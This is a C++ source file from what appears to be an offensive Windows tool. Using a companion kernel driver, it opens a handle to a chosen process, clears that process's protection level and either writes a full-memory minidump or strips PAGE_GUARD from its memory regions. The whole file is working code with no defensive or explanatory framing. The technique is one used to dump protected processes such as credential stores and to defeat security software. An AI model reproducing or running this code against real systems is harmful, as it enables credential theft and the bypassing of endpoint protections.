#include "Commands.h"
#include "DriverIpc.h"
#include "UI.h"
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")
#include <vector>
#include <conio.h>
#include <winternl.h>


// =================================================================
// SeDebugPrivilege
// =================================================================
static void EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

// -----------------------------------------------------------------
// DumpCtx — carries state needed by WriteMiniDump
// -----------------------------------------------------------------
struct DumpCtx {
    HANDLE  hProcess;
    DWORD   pid;
    char    procName[64];
};

// -----------------------------------------------------------------
// -----------------------------------------------------------------
// DumpCallback — called per-thread and per-memory-region.
// Forces full thread stack inclusion (overrides guard-page skipping)
// and includes all readable memory regions including PAGE_GUARD pages.
// -----------------------------------------------------------------
static BOOL CALLBACK DumpCallback(
    PVOID                            CallbackParam,
    PMINIDUMP_CALLBACK_INPUT         CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT        CallbackOutput)
{
    UNREFERENCED_PARAMETER(CallbackParam);
    switch (CallbackInput->CallbackType)
    {
    case ThreadCallback:
        // Write the full stack for every thread, not just the committed portion.
        // Without this, guard pages and the reserved-but-uncommitted stack region
        // are silently omitted by MiniDumpWriteDump.
        CallbackOutput->ThreadWriteFlags =
            ThreadWriteThread       |
            ThreadWriteStack        |
            ThreadWriteContext      |
            ThreadWriteInstructionWindow |
            ThreadWriteThreadData   |
            ThreadWriteThreadInfo;
        return TRUE;

    case MemoryCallback:
        // Accept the memory region the engine proposes — return TRUE to include it.
        return TRUE;

    case IncludeThreadCallback:
        // Include every thread.
        CallbackOutput->ThreadWriteFlags = ThreadWriteThread;
        return TRUE;

    case IncludeModuleCallback:
        // Include every module.
        CallbackOutput->ModuleWriteFlags = ModuleWriteModule;
        return TRUE;

    default:
        return TRUE;
    }
}

// -----------------------------------------------------------------
// WriteMiniDump
// -----------------------------------------------------------------
static bool WriteMiniDump(DumpCtx* ctx, const wchar_t* filename)
{
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile('%ls') failed: %lu\n", filename, GetLastError());
        return false;
    }

    printf("[*] Writing minidump (PID %lu) to '%ls'...\n", ctx->pid, filename);
    fflush(stdout);

    EnableDebugPrivilege();

    MINIDUMP_CALLBACK_INFORMATION mci = {};
    mci.CallbackRoutine = DumpCallback;
    mci.CallbackParam   = nullptr;

    BOOL ok = FALSE;
    DWORD writeErr = 0;
    __try {
        MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
            MiniDumpWithFullMemory          |   // all committed memory pages
            MiniDumpWithHandleData          |   // open handle table
            MiniDumpWithFullMemoryInfo      |   // VAD / memory-region info
            MiniDumpWithThreadInfo          |   // extended thread info
            MiniDumpWithUnloadedModules         // previously unloaded modules
        );
        ok = MiniDumpWriteDump(ctx->hProcess, ctx->pid, hFile,
            dumpType, nullptr, nullptr, &mci);
        writeErr = ok ? 0 : GetLastError();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        writeErr = GetExceptionCode();
        printf("[-] MiniDumpWriteDump raised exception: 0x%08lX\n", writeErr);
        fflush(stdout);
    }

    CloseHandle(hFile);
    if (!ok) {
        printf("[-] MiniDumpWriteDump failed: 0x%08lX\n", writeErr);
        DeleteFileW(filename);
        return false;
    }
    printf("[+] Minidump written successfully\n");
    return true;
}

// -----------------------------------------------------------------
// CmdZDump — 'Z' entry point called from the main loop
// -----------------------------------------------------------------
void CmdZDump(CmdContext* ctx)
{
    BoxTop("Z: Dump / Protect");
    BoxRow("  D  minidump to file");
    BoxRow("  P  strip protection + get handle");
    BoxBot();
    printf("Action [D/P]: ");
    fflush(stdout);
    int action = _getch(); printf("%c\n", action);

    char procLine[64];
    snprintf(procLine, sizeof(procLine), "  S=%-18s  T=%s",
        (ctx->sourceProcess && ctx->sourceProcess[0]) ? ctx->sourceProcess : "not set",
        (ctx->targetProcess && ctx->targetProcess[0]) ? ctx->targetProcess : "not set");
    BoxTop("Process");
    BoxRow(procLine);
    BoxBot();
    printf("Process [S/T]: ");
    fflush(stdout);
    int zctx = _getch(); printf("%c\n", zctx);
    bool zUseSource = (zctx == 's' || zctx == 'S');
    const char* zProc = zUseSource ? ctx->sourceProcess : ctx->targetProcess;
    if (!zProc || !zProc[0]) { printf("[-] Process not set\n"); return; }

    // Build IpcCtx from CmdContext
    IpcCtx ipc = {};
    ipc.hEventVAD_INSERT = ctx->hEventVAD_INSERT;
    ipc.hEventINIT       = ctx->hEventINIT;
    ipc.VadModifyArray   = ctx->VadModifyArray;
    ipc.SymbolsArray     = ctx->SymbolsArray;
    ipc.sourceProcess    = ctx->sourceProcess;
    ipc.targetProcess    = zProc;
    ipc.sourceVA         = ctx->sourceVA;

    // Set kernel context
    printf("[*] Setting kernel context to '%s'...\n", zProc);
    if (!Ipc_SetKernelContext(&ipc, ctx->sourceProcess, zProc)) return;

    // Open process handle via driver
    printf("[*] Requesting kernel handle via OPRC...\n");
    HANDLE hProc = NULL;
    DWORD  pid   = 0;
    if (!Ipc_OpenProcess(&ipc, &hProc, &pid)) return;
    printf("[+] Got handle 0x%p  PID=%lu  for '%s'\n", hProc, pid, zProc);

    // Strip protection
    UCHAR savedProtection = 0;
    Ipc_ClearProtection(&ipc, &savedProtection);

    // ── [P] action: strip + hold handle, then restore ───────────────
    if (action == 'p' || action == 'P') {
        printf("[+] Handle 0x%p is open in this process for '%s' (PID %lu)\n",
               hProc, zProc, pid);

        // Strip PAGE_GUARD from all stack regions so tools like Process Explorer
        // can read/write the full committed stack without access violations.
        // We collect each region's original protect so we can restore them exactly.
        struct GuardRegion { LPVOID base; SIZE_T size; DWORD oldProt; };
        std::vector<GuardRegion> guardRegions;
        {
            LPVOID addr = nullptr;
            MEMORY_BASIC_INFORMATION mbi = {};
            while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if ((mbi.Protect & PAGE_GUARD) && mbi.State == MEM_COMMIT) {
                    DWORD oldProt = 0;
                    DWORD newProt = mbi.Protect & ~PAGE_GUARD;
                    if (newProt == 0) newProt = PAGE_READWRITE;
                    if (VirtualProtectEx(hProc, mbi.BaseAddress, mbi.RegionSize, newProt, &oldProt))
                        guardRegions.push_back({ mbi.BaseAddress, mbi.RegionSize, oldProt });
                }
                addr = (LPVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
            }
            printf("[+] Stripped PAGE_GUARD from %zu region(s)\n", guardRegions.size());
        }

        printf("[*] Protection stripped. Press any key to restore and close handle...\n");
        fflush(stdout);
        _getch();

        // Restore PAGE_GUARD on all regions we modified
        for (auto& r : guardRegions) {
            DWORD dummy = 0;
            VirtualProtectEx(hProc, r.base, r.size, r.oldProt, &dummy);
        }
        printf("[+] PAGE_GUARD restored on %zu region(s)\n", guardRegions.size());

        Ipc_RestoreProtection(&ipc, savedProtection);
        CloseHandle(hProc);
        return;
    }

    // ── [D] action: full minidump flow ──────────────────────────────

    // Output filename
    printf("Output file [blank = %s.dmp]: ", zProc); fflush(stdout);
    memset(ctx->inputBuffer, 0, sizeof(ctx->inputBuffer));
    ctx->inputIndex = 0;
    while ((ctx->inputChar = _getch()) != '\r' && ctx->inputChar != '\n') {
        if (ctx->inputChar == '\b' && ctx->inputIndex > 0)
            { ctx->inputBuffer[--ctx->inputIndex] = 0; printf("\b \b"); }
        else if (ctx->inputIndex < (int)sizeof(ctx->inputBuffer)-1)
            { ctx->inputBuffer[ctx->inputIndex++] = (char)ctx->inputChar; printf("%c", ctx->inputChar); }
    }
    printf("\n"); ctx->inputBuffer[ctx->inputIndex] = 0;

    wchar_t wPath[MAX_PATH] = {};
    if (ctx->inputIndex > 0)
        MultiByteToWideChar(CP_UTF8, 0, ctx->inputBuffer, -1, wPath, MAX_PATH);
    else
        swprintf_s(wPath, MAX_PATH, L"%hs.dmp", zProc);

    DumpCtx dctx = {};
    dctx.hProcess = hProc;
    dctx.pid      = pid;
    strncpy_s(dctx.procName, zProc, _TRUNCATE);

    printf("[*] PID=%lu  Process='%s'  Output='%ls'\n", pid, zProc, wPath);
    bool ok = WriteMiniDump(&dctx, wPath);

    Ipc_RestoreProtection(&ipc, savedProtection);
    CloseHandle(hProc);

    if (ok) {
        WIN32_FILE_ATTRIBUTE_DATA fa = {};
        if (GetFileAttributesExW(wPath, GetFileExInfoStandard, &fa)) {
            ULONGLONG sz = ((ULONGLONG)fa.nFileSizeHigh << 32) | fa.nFileSizeLow;
            printf("[+] Dump file: '%ls'  (%llu KB)\n", wPath, sz / 1024);
        }
    }
}
